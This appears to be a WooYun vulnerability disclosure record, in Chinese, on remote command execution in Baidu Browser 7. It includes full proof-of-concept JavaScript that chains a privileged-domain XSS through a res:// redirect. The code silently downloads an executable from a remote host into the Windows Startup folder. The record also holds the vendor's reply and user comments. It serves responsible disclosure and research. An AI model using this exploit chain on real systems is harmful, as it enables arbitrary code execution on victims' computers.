{"id": 46843, "wybug_id": "wooyun-2014-083294", "wybug_title": "百度浏览器远程命令执行五", "wybug_corp": "百度", "wybug_author": "gainover", "wybug_date": "2014-11-14 17:54", "wybug_open_date": "2015-02-12 17:56", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行", "浏览器漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-20：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-12：\t细节向公众公开  简要描述： 一直以为百度浏览器没更新哇，看新闻才知道，百度浏览器已经发布第7版本（7.0.400.292），于是又下载下来研究了一番，相对于第6版本，在一些API上确实有了不小的安全改进，但是也有一些7版本上的改进，反而导致可以远程命令执行。 详细说明：  1. 首先，我们用百度浏览器随便打开一个本地的页面，比如file:///C:/xxxxxx，你会发现出现以下报错，F12控制台内 location.href查看，可以看到URL改变为：data:text/html,biduwebdata \n\n不要奇怪我为什么会这么测试，因为在6版本的百度浏览器中 data:text/html,biduwebdata 域下存在XSS，所以我其实是想看看 data:text/html,biduwebdata 在7版本中是否也存在，你可以看到我们所输入的URL在页面中被输出，那么会不会这里没有转义呢？\n\n于是在bdbrowser域下用以下代码进行测试，（因为http域无法重定向至 file域，所以在bdbrowser域下测试）：\nlocation.href='file:///C:/xxxxxx#\"><img/src=\"1\"/onerror=\"alert(1)\">'\n可以看到弹窗了。\n\n2. 第2个问题来了， data:text/html,biduwebdata 这个是data协议的，这个协议下有特权吗？ 答案是：6版本的百度浏览器是没有的，但这个最新版本的，data:text/html,biduwebdata 这个URL下是有特权的，但其它data:xxx是没有的。3. 这样一来，我们的第一步，特权域XSS就已经有了。但是，我们如何从http域重定向至file域呢？A. 我们重定向至一个不存在的协议？\n\n似乎并不能实现和file域一样的效果。B. about协议则直接打开了空白页C. 还有一个比较常见的res://协议，我们试试～～\nlocation.href='res:///C:/xxxxxx#\"><img/src=\"1\"/onerror=\"alert(1)\">'\n\n\n如上图所示，我们可以看到res协议实现了和file协议一样的效果，且 http协议可以跳转至res协议4. 因此，XSS我们有了， 如何实现命令执行呢？ 我对之前测试过的API进行了一些测试，例如皮肤下载，插件下载，均已作出了一定的安全限制。然而，有一个功能比较显眼：\n\n上图涉及到2个部分：一是静默下载，即不需要用户交互，便可将指定程序下载到下载目录。二是下载目录设置。如果我们设置为静默下载，并将下载目录指向用户的启动目录，然后让用户下载一个exe，那么该exe将会被下载到用户的启动目录中。5. 有了特权域的XSS，以上想法，我们并不难实现，这里直接给出代码，代码中含有注释。A. 重定向至res://....，触发XSS，调用baidupoc5.js\n<html>\t<head>百度浏览器命令执行5</head>\t<body>\t\t<script>\t\t\twindow.name='var s=document.createElement(\"script\");s.src=\"http://127.0.0.1/test/baidupoc5.js\";document.body.appendChild(s);';\t\t\tlocation.href='res://c/Users/gainover/Desktop/xxxxx#\"><img src=1 onerror=eval(window.name)>'\t\t</script>\t</body></html>\nB. baidupoc5.js代码如下：\nvar isWin7=/NT\\s+6/.test(navigator.userAgent);/*获取用户名*/function getUserNameCallback(id,res){\tconsole.log(arguments);\tif(!res){\t\t\tconsole.log(\"download skin error\");\t\treturn ;\t}\tvar data=JSON.parse(res);\tvar path=data.body.path;\tvar d=path.substring(0,1);\tvar user=isWin7?(path.match(/\\\\Users\\\\([^\\\\]+)\\\\/)||[\"\",\"\"])[1]:(path.match(/\\\\Documents and Settings\\\\([^\\\\]+)\\\\/)||[\"\",\"\"])[1];\tconsole.log(path);\tconsole.log(user);\tsetDownloadDir(d,user);}/*设置下载目录*/function setDownloadDir(d,user){\tvar win7=d+\"://Users/\"+user+\"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/\";\tvar xp=d+\"://Documents and Settings/\"+user+\"/「开始」菜单/程序/启动/\";\tvar dir=isWin7?win7:xp;\twindow.external.StartRequest(1058,\"set_string_pref\",\"\",\"[\\\"download_default_directory\\\",\\\"\"+dir+\"\\\"]\");\tconsole.log(\"download directory\");\tsetTimeout(function(){setDownloadSilent()},100);}/*静默下载*/function setDownloadSilent(){\twindow.external.StartRequest(1059,\"set_boolean_pref\",\"\",\"[\\\"download_auto_save\\\",true]\");\tconsole.log(\"download settings\");\tsetTimeout(function(){startDownload()},100);}/*开始下载*/function startDownload(){\tconsole.log(\"download exe\");\tlocation.href=\"http://192.168.1.13/calc.exe\";}\t/*入口*/function main(){\twindow.external.StartRequest(1057,\"theme_apply\",\"getUserNameCallback\",\"[{\\\"md5\\\":\\\"0a696bf6144f37186eb2ba4b637c97da\\\",\\\"id\\\":\\\"0a696bf6144f37186eb2ba4b637c97da\\\",\\\"src\\\":\\\"http://webimg.br.baidu.com/odin/201410/0a696bf6144f37186eb2ba4b637c97da.jpg\\\",\\\"thumb\\\":\\\"http://webimg.br.baidu.com/odin/201410/a57d9c085d1cca1c16a1265f0bea040e.jpg\\\",\\\"subject\\\":\\\"大桥夜景\\\",\\\"tone\\\":0,\\\"tag\\\":\\\"风景\\\",\\\"desc\\\":\\\"\\\",\\\"from\\\":0,\\\"themeId\\\":\\\"41\\\",\\\"name\\\":\\\"大桥夜景\\\",\\\"category\\\":\\\"精选\\\",\\\"position\\\":4}]\");}main();\n   漏洞证明：  以上代码在Win7下进行测试，截图如下：\n\nxp下也测试通过。   修复方案：  修复 data:text/html,biduwebdata 下的XSS，浏览器在设置用户下载目录时，需要启用一定的用户交互，以避免随意一个特权域XSS即可更改此设置。   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-11-17 12:35 厂商回复： 感谢提交，已通知业务部门处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-14 17:55 |    \t\t大孩小孩 \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:7        | 哈哈哈哈)\t\t \n  mark    \n     2014-11-14 17:55 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  前排!~~    \n     2014-11-14 17:56 |    \t\t孤独雪狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:710 漏洞数:145        | 七夕手机被偷，这坑爹的七夕啊 。。。。)\t\t \n  前排!~~    \n     2014-11-14 17:58 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  第五发了。。    \n     2014-11-14 18:04 |    \t\tVinGogh \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:7        | G.X.)\t\t \n  吊炸天    \n     2014-11-14 18:04 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  坐等百度浏览器更新第八版。。。    \n     2014-11-14 18:23 |    \t\t天朝城管 \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:35        | 不要等到命玩你的时候才开始玩命)\t\t \n  penta kill    \n     2014-11-14 18:32 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  还有第几发？    \n     2014-11-14 18:44 |    \t\tDemon \t\t\t( 普通白帽子  |\t\t\t        Rank:121 漏洞数:14        | You are my dream)\t\t \n  god like    \n     2014-11-14 18:52 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  能连载到10么    \n     2014-11-14 19:15 |    \t\t机器猫 \t\t\t( 普通白帽子  |\t\t\t        Rank:1141 漏洞数:253        | 爱生活、爱腾讯、爱网络！)\t\t \n  ccav看这里    \n     2014-11-14 19:25 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  不忍直视了。。。    \n     2014-11-14 19:34 |    \t\tanswer \t\t\t( 普通白帽子  |\t\t\t        Rank:347 漏洞数:45        | 答案)\t\t \n  66666    \n     2014-11-14 19:51 |    \t\tMeirLin \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:30        | 号借人)\t\t \n  又可以做教程了    \n     2014-11-14 20:12 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  二哥一直在等百度更新，然后绕过    \n     2014-11-14 20:14 |    \t\tanon \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:6        | AnOnYMoUs我是一只小马甲)\t\t \n  百度浏览器宣布停止更新.    \n     2014-11-14 20:26 |    \t\tGuardian \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:20        | I'm from the Internet and be here to hel...)\t\t \n  围观~    \n     2014-11-14 20:38 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  百度浏览器宣布停止维护，我们放弃该产品！@gainover     \n     2014-11-14 21:53 |    \t\tStardustsky \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | ……)\t\t \n  那些年我们一起X过的百度浏览器    \n     2014-11-15 10:09 |    \t\t心伤的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:147 漏洞数:21        | 严肃点~此号为虚拟小号，并不存在实体...)\t\t \n  厂商回应：已通知工程师赶紧更新，必须给二哥制造二十连载的机会，另外在此洞所有评论者中随机抽取一位白帽，送出两包辣条，不要问我为什么，有钱、任性。@百度    \n     2014-11-28 18:56 |    \t\t辣条 \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:26        | 辣条5毛钱一袋，要不要？)\t\t \n  @心伤的瘦子 送我吗？@辣条     \n     2014-11-29 08:17 |    \t\t心伤的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:147 漏洞数:21        | 严肃点~此号为虚拟小号，并不存在实体...)\t\t \n  @辣条 ，，，还没到把你送出去的时间，你怎么自己出来了    \n     2015-01-23 23:54 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3224 漏洞数:254        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  厉害    \n     2015-02-12 20:29 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2360 漏洞数:406        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  确实很厉害    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}